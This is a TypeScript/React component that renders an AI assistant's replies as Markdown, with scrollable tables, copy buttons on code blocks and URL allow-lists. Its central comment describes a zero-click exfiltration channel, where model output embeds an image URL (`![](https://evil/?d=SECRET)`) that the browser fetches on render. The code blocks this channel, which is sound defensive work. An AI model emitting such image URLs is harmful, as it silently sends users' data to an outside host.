/**
 * Markdown rendering for assistant replies (PRD §3.1).
 *
 * Two things matter here beyond correctness. Tables and code blocks get their
 * own horizontal scroll container so a wide result never makes the whole
 * thread scroll sideways on a phone. And every code block gets a copy button,
 * because copying code out of a chat is the single most common thing anyone
 * does with it.
 */

import { memo, type ReactNode } from 'react';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import rehypeHighlight from 'rehype-highlight';

import { CopyButton } from '@/ui/primitives';

function codeLanguage(className: string | undefined): string {
  const match = /language-([\w-]+)/.exec(className ?? '');
  return match?.[1] ?? '';
}

/**
 * Which URLs a MODEL is allowed to put in front of the browser.
 *
 * Model output is untrusted. Rendering `![](https://evil/?d=SECRET)` makes the
 * browser issue a GET the moment the message paints — no click, no consent —
 * and React additionally emits a `<link rel="preload" as="image">`, so it
 * fires even earlier. That is a zero-click exfiltration channel out of an app
 * whose whole premise is that nothing leaves the device, and neither the web
 * nor the mobile build ships a CSP that would stop it.
 *
 * So: images may only come from THIS origin or from bytes the app itself
 * produced (`data:`, `blob:` — how an attachment the user added is rendered).
 * Anything else is dropped rather than rewritten, because a broken image the
 * user can see beats a silent request they cannot.
 *
 * Links keep `http(s)` — a link is a click the user makes deliberately, which
 * is a different act from a fetch the page makes on their behalf — but
 * `javascript:` and `data:` are refused there.
 */
const SAFE_IMAGE = /^(?:data:image\/|blob:|\/(?!\/))/i;
const SAFE_LINK = /^(?:https?:\/\/|mailto:|#|\/(?!\/))/i;

function safeUrl(url: string, kind: 'image' | 'link'): string {
  const trimmed = url.trim();
  const pattern = kind === 'image' ? SAFE_IMAGE : SAFE_LINK;
  return pattern.test(trimmed) ? trimmed : '';
}

export const Markdown = memo(function Markdown({ text }: { text: string }): ReactNode {
  return (
    <div className="md">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[[rehypeHighlight, { detect: true, ignoreMissing: true }]]}
        urlTransform={(url, key) => safeUrl(url, key === 'src' ? 'image' : 'link')}
        components={{
          pre({ children }) {
            return <CodeBlock>{children}</CodeBlock>;
          },
          table({ children }) {
            return (
              <div className="md-scroll">
                <table>{children}</table>
              </div>
            );
          },
          a({ href, children }) {
            // External links open in the system browser rather than replacing
            // the webview, which would strand the user outside the app.
            return (
              <a href={href} target="_blank" rel="noreferrer noopener">
                {children}
              </a>
            );
          },
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
});

function CodeBlock({ children }: { children: ReactNode }): ReactNode {
  const element = extractCodeElement(children);
  const source = element ? String(element.props.children ?? '') : '';
  const language = element ? codeLanguage(element.props.className) : '';

  return (
    <div style={{ position: 'relative' }}>
      {language ? (
        <span
          className="readout"
          style={{ position: 'absolute', top: 8, left: 12, pointerEvents: 'none' }}
        >
          {language}
        </span>
      ) : null}
      <div style={{ position: 'absolute', top: 4, right: 4 }}>
        <CopyButton text={source} label="Copy code" />
      </div>
      <pre style={language ? { paddingTop: 'var(--s-5)' } : undefined}>{children}</pre>
    </div>
  );
}

interface CodeElement {
  props: { children?: unknown; className?: string };
}

function extractCodeElement(children: ReactNode): CodeElement | null {
  const first = Array.isArray(children) ? children[0] : children;
  if (first && typeof first === 'object' && 'props' in first) {
    return first as CodeElement;
  }
  return null;
}
